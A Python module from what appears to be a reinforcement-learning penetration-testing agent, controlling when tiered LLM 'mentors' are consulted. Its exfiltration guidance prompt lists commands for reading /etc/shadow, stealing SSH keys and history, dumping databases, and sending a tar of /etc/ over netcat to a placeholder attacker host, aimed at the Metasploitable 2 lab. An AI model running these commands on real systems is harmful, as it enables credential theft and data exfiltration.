#!/usr/bin/env python3
"""
core/training/mentor_controller.py — ARIASKA Mentor Controller v1.0

Smart 3-tier mentor engagement system with budget, fade, and trigger-based routing.

TIERS:
  reactive      → gpt-5.1-codex-mini  (cheap, fast — uncertainty / quick hints)
  deliberative  → gpt-5.1-codex       (mid-cost — stagnation / strategic replanning)
  postmortem    → gpt-5.2-codex       (expensive — end-of-run deep analysis only)

TRIGGERS:
  1. uncertainty    — PPO entropy high / confidence low      → reactive
  2. stagnation     — no discoveries for N steps             → deliberative
  3. phase_transition — new phase needs strategic replanning → deliberative
  4. objective_gap  — POST_EXPLOIT 3× without EXFIL          → deliberative (exfil-specific)
  5. forced         — orchestrator explicitly requests        → deliberative

BUDGET:
  - Per-episode token budget with fade: starts at budget_pct of max_steps,
    decays as success_rate improves, floor at min_rate.
  - Running totals tracked per episode; calls gated by remaining budget.

EXFILTRATION CURRICULUM GATE:
  - Tracks consecutive episodes reaching POST_EXPLOITATION without EXFILTRATION.
  - After exfil_patience failures, forces deliberative mentor with exfil-specific prompt.
"""

import logging
import random
import time
from typing import Optional, Dict, Any, List, Tuple
from dataclasses import dataclass, field
from enum import Enum

logger = logging.getLogger("ariaska.mentor_controller")


# ---------------------------------------------------------------------------
# Enums & Config
# ---------------------------------------------------------------------------

class MentorTier(str, Enum):
    """3-tier mentor model routing."""
    REACTIVE = "reactive"           # gpt-5.1-codex-mini — cheap, fast
    DELIBERATIVE = "deliberative"   # gpt-5.1-codex — strategic
    POSTMORTEM = "postmortem"       # gpt-5.2-codex — deep analysis


class MentorTrigger(str, Enum):
    """Why the mentor was engaged."""
    UNCERTAINTY = "uncertainty"
    STAGNATION = "stagnation"
    PHASE_TRANSITION = "phase_transition"
    OBJECTIVE_GAP = "objective_gap"     # POST_EXPLOIT without EXFIL
    FORCED = "forced"
    WARMUP = "warmup"
    BUDGET_FLOOR = "budget_floor"       # Minimum engagement rate enforcement
    DDQN_UNCERTAINTY = "ddqn_uncertainty"  # Phase 9.0: DDQN macro selector uncertain
    NONE = "none"


# Model mapping: tier → model name
# Phase 8.2: DELIBERATIVE upgraded to gpt-5.2-codex for deeper strategic reasoning
# REACTIVE stays cheap (codex-mini), DELIBERATIVE+POSTMORTEM use 5.2 for quality
TIER_MODELS: Dict[MentorTier, str] = {
    MentorTier.REACTIVE: "gpt-5.1-codex-mini",
    MentorTier.DELIBERATIVE: "gpt-5.2-codex",
    MentorTier.POSTMORTEM: "gpt-5.2-codex",
}


@dataclass
class MentorControllerConfig:
    """Configuration for the 3-tier mentor controller.
    
    Phase 7.1 tuning: Increased budget for smarter reasoning guidance.
    Codex-mini is cheap enough to use more frequently for REASONING checks.
    Budget still anneals to keep long-term costs manageable.
    """

    # Budget: percentage of max_steps that can trigger mentor calls
    # Phase 8.2: Raised for LIVE mode — real targets need more mentor guidance
    budget_pct: float = 0.50          # Phase 8.2: 50% → aggressive mentor for LIVE training
    min_rate: float = 0.15            # Phase 8.2: 15% floor — always substantial guidance
    max_rate: float = 0.60            # Phase 8.2: Allow up to 60% during warmup
    fade_episodes: int = 80           # Phase 8.2: Slower fade — LIVE needs longer guidance

    # Warmup: first N episodes use mentor more aggressively
    warmup_episodes: int = 12         # Phase 8.2: 12 episodes warmup (was 8)
    warmup_rate: float = 0.55         # Phase 8.2: 55% call rate during warmup

    # Per-episode hard limit — Phase 13.0: Increased for deep autonomous learning
    max_calls_per_episode: int = 80   # Phase 13.0: +60% (was 50) — more GPT reasoning per episode

    # Cooldown between consecutive mentor calls (steps)
    cooldown_steps: int = 1             # Phase 7.3: Reduced from 2 → 1 for live mode responsiveness

    # --- Trigger thresholds ---

    # Uncertainty: PPO confidence below this → reactive mentor
    # Phase 13.0: Lowered to trigger mentor earlier when agents are uncertain
    uncertainty_threshold: float = 0.25  # Phase 13.0: 0.30→0.25 — engage mentor sooner for deeper learning

    # Stagnation: no new discoveries for N steps → deliberative
    stagnation_threshold: int = 3       # Phase 7.3: Reduced to 3 (was 4) — fire codex-mini faster when stuck

    # Phase transition always triggers deliberative
    phase_transition_enabled: bool = True

    # --- EXFIL curriculum gate ---
    exfil_patience: int = 3           # Episodes stuck at POST_EXPLOIT before forcing exfil mentor
    exfil_mentor_tier: MentorTier = MentorTier.DELIBERATIVE

    # --- Phase 9.0: DDQN uncertainty trigger ---
    # When DDQN macro selector has high TD error and mid-range epsilon,
    # it's learning but struggling — mentor guidance is most valuable here.
    ddqn_td_error_threshold: float = 1.0    # Phase 13.0: 1.5→1.0 — trigger mentor guidance earlier for DDQN
    ddqn_epsilon_range: Tuple[float, float] = (0.15, 0.45)  # Active learning window
    ddqn_trigger_cooldown: int = 3    # Min steps between DDQN-triggered mentor calls

    # --- Model overrides ---
    # Phase 7.1: DELIBERATIVE also uses codex-mini for cost savings
    # Only POSTMORTEM uses expensive gpt-5.2-codex
    tier_models: Dict[str, str] = field(default_factory=lambda: {
        "reactive": "gpt-5.1-codex-mini",
        "deliberative": "gpt-5.2-codex",  # Phase 8.2: Upgraded for deeper strategic reasoning
        "postmortem": "gpt-5.2-codex",
    })


# ---------------------------------------------------------------------------
# Engagement decision result
# ---------------------------------------------------------------------------

@dataclass
class MentorEngagement:
    """Result of should_engage() — whether and how to call mentor."""
    engage: bool = False
    tier: MentorTier = MentorTier.REACTIVE
    trigger: MentorTrigger = MentorTrigger.NONE
    model: str = "gpt-5.1-codex-mini"
    reason: str = ""
    exfil_guidance: bool = False      # True if exfil-specific prompt should be injected
    max_tokens: int = 300             # Token limit for this call

    def __bool__(self) -> bool:
        return self.engage


# ---------------------------------------------------------------------------
# MentorController
# ---------------------------------------------------------------------------

class MentorController:
    """
    3-tier mentor engagement controller with budget, fade, and curriculum gates.

    Designed to replace the hard 3-condition gating in SmartCoach.decide().
    """

    def __init__(self, config: Optional[MentorControllerConfig] = None):
        self.config = config or MentorControllerConfig()

        # --- Episode state ---
        self.current_episode: int = 0
        self.current_step: int = 0
        self.calls_this_episode: int = 0
        self.steps_since_last_call: int = 999
        self._episode_budget: int = 0       # Computed at episode start

        # --- Stagnation tracking ---
        self._stagnation_steps: int = 0
        self._last_discovery_step: int = 0

        # --- EXFIL curriculum gate ---
        self._post_exploit_without_exfil: int = 0   # Consecutive episodes
        self._episode_reached_post_exploit: bool = False
        self._episode_reached_exfil: bool = False

        # --- Per-episode success tracking (for fade) ---
        self._recent_success_rates: List[float] = []  # Last N episodes
        self._episode_successes: int = 0
        self._episode_decisions: int = 0

        # --- Running stats ---
        self.total_calls: int = 0
        self.total_decisions: int = 0
        self.tier_counts: Dict[str, int] = {t.value: 0 for t in MentorTier}
        self.trigger_counts: Dict[str, int] = {t.value: 0 for t in MentorTrigger}

        # --- Phase 9.0: DDQN uncertainty tracking ---
        self._steps_since_ddqn_trigger: int = 999

        logger.info(
            f"MentorController initialized: budget={self.config.budget_pct:.0%}, "
            f"min_rate={self.config.min_rate:.0%}, "
            f"fade_episodes={self.config.fade_episodes}, "
            f"exfil_patience={self.config.exfil_patience}"
        )

    # ------------------------------------------------------------------
    # Episode lifecycle
    # ------------------------------------------------------------------

    def start_episode(self, episode: int, max_steps: int = 120) -> None:
        """Reset state for a new episode."""
        self.current_episode = episode
        self.current_step = 0
        self.calls_this_episode = 0
        self.steps_since_last_call = 999

        self._stagnation_steps = 0
        self._last_discovery_step = 0

        self._episode_reached_post_exploit = False
        self._episode_reached_exfil = False
        self._episode_successes = 0
        self._episode_decisions = 0

        # Compute episode budget
        rate = self._compute_budget_rate()
        self._episode_budget = max(2, int(max_steps * rate))

        logger.debug(
            f"[MentorCtrl] Episode {episode}: budget={self._episode_budget} calls "
            f"(rate={rate:.2%}), exfil_debt={self._post_exploit_without_exfil}"
        )

    def end_episode(self, highest_phase: str) -> None:
        """
        Record episode outcome for EXFIL curriculum gate and success fade.

        Args:
            highest_phase: Highest phase name reached (e.g. "EXFILTRATION", "POST_EXPLOITATION")
        """
        phase_upper = highest_phase.upper() if isinstance(highest_phase, str) else str(highest_phase).upper()

        # EXFIL gate tracking
        if "POST_EXPLOITATION" in phase_upper or "LATERAL" in phase_upper:
            self._episode_reached_post_exploit = True
        if "EXFILTRATION" in phase_upper:
            self._episode_reached_exfil = True

        if self._episode_reached_post_exploit and not self._episode_reached_exfil:
            self._post_exploit_without_exfil += 1
            logger.info(
                f"[MentorCtrl] EXFIL debt: {self._post_exploit_without_exfil}/"
                f"{self.config.exfil_patience} (POST_EXPLOIT without EXFIL)"
            )
        elif self._episode_reached_exfil:
            self._post_exploit_without_exfil = 0
            logger.info("[MentorCtrl] EXFIL debt cleared — episode reached EXFILTRATION")

        # Success rate tracking for fade
        ep_rate = self._episode_successes / max(self._episode_decisions, 1)
        self._recent_success_rates.append(ep_rate)
        if len(self._recent_success_rates) > 20:
            self._recent_success_rates = self._recent_success_rates[-20:]

    def step(self) -> None:
        """Advance step counter."""
        self.current_step += 1
        self.steps_since_last_call += 1
        self._stagnation_steps += 1
        self._steps_since_ddqn_trigger += 1

    def record_discovery(self) -> None:
        """Record that a new discovery was made this step (resets stagnation)."""
        self._stagnation_steps = 0
        self._last_discovery_step = self.current_step

    def record_outcome(self, reward: float) -> None:
        """Record step outcome for success rate tracking."""
        self._episode_decisions += 1
        self.total_decisions += 1
        if reward > 0:
            self._episode_successes += 1

    def record_phase(self, phase_name: str) -> None:
        """Record phase reached (for exfil gate)."""
        phase_upper = phase_name.upper() if isinstance(phase_name, str) else str(phase_name).upper()
        if "POST_EXPLOITATION" in phase_upper or "LATERAL" in phase_upper:
            self._episode_reached_post_exploit = True
        if "EXFILTRATION" in phase_upper:
            self._episode_reached_exfil = True

    # ------------------------------------------------------------------
    # Core decision: should_engage()
    # ------------------------------------------------------------------

    def should_engage(
        self,
        *,
        confidence: float = 0.5,
        ppo_entropy: float = 0.0,
        phase_changed: bool = False,
        prev_phase: Optional[str] = None,
        current_phase: str = "",
        force: bool = False,
        ddqn_confidence: Optional[Dict[str, float]] = None,
    ) -> MentorEngagement:
        """
        Determine whether the mentor should be called and at which tier.

        Returns a MentorEngagement with engage=True/False, tier, model, reason.

        Args:
            confidence: PPO/agent confidence in current decision (0-1)
            ppo_entropy: PPO action distribution entropy (higher = more uncertain)
            phase_changed: Whether phase just changed
            prev_phase: Previous phase name
            current_phase: Current phase name
            force: Orchestrator explicitly requests mentor
            ddqn_confidence: Phase 9.0 — DDQN macro selector confidence metrics
                {avg_td_error, avg_q_value, epsilon, buffer_size, update_count}
        """
        # --- Hard limits ---
        if self.calls_this_episode >= min(self._episode_budget, self.config.max_calls_per_episode):
            return MentorEngagement(engage=False, reason="budget_exhausted")

        if self.steps_since_last_call < self.config.cooldown_steps:
            return MentorEngagement(engage=False, reason="cooldown")

        # --- Trigger evaluation (priority order) ---

        # T1: Forced by orchestrator
        if force:
            return self._make_engagement(
                MentorTier.DELIBERATIVE, MentorTrigger.FORCED,
                reason="forced_by_orchestrator",
            )

        # T2: Phase transition → deliberative (strategic replanning)
        if phase_changed and self.config.phase_transition_enabled:
            return self._make_engagement(
                MentorTier.DELIBERATIVE, MentorTrigger.PHASE_TRANSITION,
                reason=f"phase_transition:{prev_phase}->{current_phase}",
            )

        # T3: EXFIL curriculum gate → deliberative with exfil prompt
        if self._should_force_exfil(current_phase):
            return self._make_engagement(
                self.config.exfil_mentor_tier, MentorTrigger.OBJECTIVE_GAP,
                reason=f"exfil_debt={self._post_exploit_without_exfil}",
                exfil_guidance=True,
                max_tokens=500,  # More tokens for strategic exfil guidance
            )

        # T4: Stagnation → deliberative (gpt-5.2-codex for deep reasoning)
        if self._stagnation_steps >= self.config.stagnation_threshold:
            return self._make_engagement(
                MentorTier.DELIBERATIVE, MentorTrigger.STAGNATION,
                reason=f"stagnation_steps={self._stagnation_steps}",
                max_tokens=500,  # Phase 8.2: More tokens for strategic stagnation-breaking
            )

        # T4.5: Phase 9.0 — DDQN macro uncertainty → deliberative
        # When the DDQN macro selector is in its active learning window
        # (epsilon between 0.15-0.45) but has high TD error (> 1.5),
        # the model is learning but struggling to distinguish strategies.
        # Strategic mentor guidance is most valuable in this window.
        if ddqn_confidence and self._steps_since_ddqn_trigger >= self.config.ddqn_trigger_cooldown:
            eps = ddqn_confidence.get("epsilon", 1.0)
            td_err = ddqn_confidence.get("avg_td_error", 0.0)
            eps_lo, eps_hi = self.config.ddqn_epsilon_range
            if eps_lo <= eps <= eps_hi and td_err > self.config.ddqn_td_error_threshold:
                self._steps_since_ddqn_trigger = 0
                return self._make_engagement(
                    MentorTier.DELIBERATIVE, MentorTrigger.DDQN_UNCERTAINTY,
                    reason=f"ddqn_uncertain(ε={eps:.2f},td={td_err:.2f})",
                    max_tokens=400,
                )

        # T5: Warmup episodes → reactive (frequent cheap calls)
        if self.current_episode < self.config.warmup_episodes:
            if random.random() < self.config.warmup_rate:
                return self._make_engagement(
                    MentorTier.REACTIVE, MentorTrigger.WARMUP,
                    reason="warmup_episode",
                    max_tokens=200,
                )

        # T6: Uncertainty — low confidence → reactive (cheap hint)
        if confidence < self.config.uncertainty_threshold:
            return self._make_engagement(
                MentorTier.REACTIVE, MentorTrigger.UNCERTAINTY,
                reason=f"low_confidence={confidence:.2f}",
                max_tokens=200,
            )

        # T7: Budget floor enforcement — ensure minimum call rate
        current_rate = self.calls_this_episode / max(self.current_step, 1)
        if current_rate < self.config.min_rate:
            if random.random() < (self.config.min_rate * 2):
                return self._make_engagement(
                    MentorTier.REACTIVE, MentorTrigger.BUDGET_FLOOR,
                    reason=f"floor_enforcement(rate={current_rate:.2%})",
                    max_tokens=200,
                )

        # No trigger fired
        return MentorEngagement(engage=False, reason="no_trigger")

    # ------------------------------------------------------------------
    # EXFIL curriculum gate
    # ------------------------------------------------------------------

    def _should_force_exfil(self, current_phase: str) -> bool:
        """Check if EXFIL curriculum gate should force mentor engagement."""
        if self._post_exploit_without_exfil < self.config.exfil_patience:
            return False

        phase_upper = current_phase.upper() if isinstance(current_phase, str) else ""

        # Only fire when we're in a phase where exfil is possible
        return any(p in phase_upper for p in [
            "POST_EXPLOITATION", "LATERAL_MOVEMENT", "PRIVILEGE_ESCALATION",
            "EXPLOITATION",
        ])

    def get_exfil_guidance_prompt(self) -> str:
        """
        Return exfil-specific prompt injection for the mentor.

        Called when exfil_guidance=True in MentorEngagement.
        """
        return (
            "\n\n⚠️ CRITICAL OBJECTIVE: The agent has reached POST_EXPLOITATION "
            f"{self._post_exploit_without_exfil} consecutive times without achieving "
            "EXFILTRATION. You MUST prioritize commands that advance toward EXFILTRATION.\n\n"
            "EXFILTRATION STRATEGIES for Metasploitable 2:\n"
            "1. Data discovery: find /home -name '*.txt' -o -name '*.conf' -o -name 'flag*'\n"
            "2. Sensitive files: cat /etc/shadow, cat /etc/passwd, ls -la /root/\n"
            "3. Database dump: mysqldump -u root --all-databases\n"
            "4. Exfil via nc: tar czf - /etc/ | nc <attacker> 9999\n"
            "5. Hash extraction: cat /etc/shadow | grep -v '\\*\\|!' \n"
            "6. Flag capture: find / -name 'flag*' -o -name 'proof*' 2>/dev/null\n"
            "7. SSH key theft: cat /root/.ssh/id_rsa 2>/dev/null\n"
            "8. History mining: cat /root/.bash_history 2>/dev/null\n\n"
            "Choose ONE of these or a similar exfiltration-advancing command. "
            "Do NOT suggest recon or exploitation commands — we already have a shell."
        )

    # ------------------------------------------------------------------
    # Budget computation
    # ------------------------------------------------------------------

    def _compute_budget_rate(self) -> float:
        """
        Compute mentor call rate for current episode.

        Starts at budget_pct, fades to min_rate over fade_episodes.
        Success accelerates fade, failure slows it.
        """
        ep = self.current_episode
        cfg = self.config

        if ep < cfg.warmup_episodes:
            return cfg.warmup_rate

        # Linear fade from budget_pct to min_rate
        fade_progress = min(1.0, (ep - cfg.warmup_episodes) / max(cfg.fade_episodes, 1))
        base_rate = cfg.budget_pct - (cfg.budget_pct - cfg.min_rate) * fade_progress

        # Accelerate/decelerate based on recent success
        if self._recent_success_rates:
            avg_success = sum(self._recent_success_rates[-10:]) / len(self._recent_success_rates[-10:])
            # High success → fade faster (less mentor needed)
            if avg_success > 0.6:
                base_rate *= 0.8
            # Low success → fade slower (more mentor needed)
            elif avg_success < 0.3:
                base_rate *= 1.3

        # Clamp
        return max(cfg.min_rate, min(cfg.max_rate, base_rate))

    # ------------------------------------------------------------------
    # Internal helpers
    # ------------------------------------------------------------------

    def _make_engagement(
        self,
        tier: MentorTier,
        trigger: MentorTrigger,
        reason: str = "",
        exfil_guidance: bool = False,
        max_tokens: int = 300,
    ) -> MentorEngagement:
        """Build engagement result and update tracking."""
        model = self.config.tier_models.get(tier.value, TIER_MODELS.get(tier, "gpt-5.1-codex-mini"))

        # Record
        self.calls_this_episode += 1
        self.total_calls += 1
        self.steps_since_last_call = 0
        self.tier_counts[tier.value] = self.tier_counts.get(tier.value, 0) + 1
        self.trigger_counts[trigger.value] = self.trigger_counts.get(trigger.value, 0) + 1

        logger.debug(
            f"[MentorCtrl] ENGAGE tier={tier.value} trigger={trigger.value} "
            f"model={model} reason={reason} (ep_calls={self.calls_this_episode}/"
            f"{self._episode_budget})"
        )

        return MentorEngagement(
            engage=True,
            tier=tier,
            trigger=trigger,
            model=model,
            reason=reason,
            exfil_guidance=exfil_guidance,
            max_tokens=max_tokens,
        )

    # ------------------------------------------------------------------
    # Stats & diagnostics
    # ------------------------------------------------------------------

    def get_stats(self) -> Dict[str, Any]:
        """Get controller statistics."""
        return {
            "total_calls": self.total_calls,
            "total_decisions": self.total_decisions,
            "call_rate": self.total_calls / max(self.total_decisions, 1),
            "current_episode": self.current_episode,
            "calls_this_episode": self.calls_this_episode,
            "episode_budget": self._episode_budget,
            "budget_rate": self._compute_budget_rate(),
            "stagnation_steps": self._stagnation_steps,
            "post_exploit_without_exfil": self._post_exploit_without_exfil,
            "tier_counts": dict(self.tier_counts),
            "trigger_counts": dict(self.trigger_counts),
        }

    def get_summary(self) -> str:
        """Human-readable summary."""
        stats = self.get_stats()
        tier_str = ", ".join(f"{k}={v}" for k, v in stats["tier_counts"].items() if v > 0)
        trig_str = ", ".join(f"{k}={v}" for k, v in stats["trigger_counts"].items() if v > 0)
        return (
            f"MentorCtrl: {stats['total_calls']} calls "
            f"({stats['call_rate']:.1%}), "
            f"exfil_debt={stats['post_exploit_without_exfil']}, "
            f"tiers=[{tier_str}], triggers=[{trig_str}]"
        )
